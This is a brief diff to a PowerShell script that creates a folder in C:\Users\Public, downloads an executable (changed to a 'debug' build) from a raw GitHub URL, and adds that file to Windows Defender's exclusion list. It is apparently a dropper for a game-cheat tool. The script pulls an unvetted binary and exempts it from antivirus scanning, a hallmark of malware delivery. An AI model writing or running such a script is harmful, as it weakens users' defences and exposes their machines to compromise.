@@ -1,6 +1,6 @@
 New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
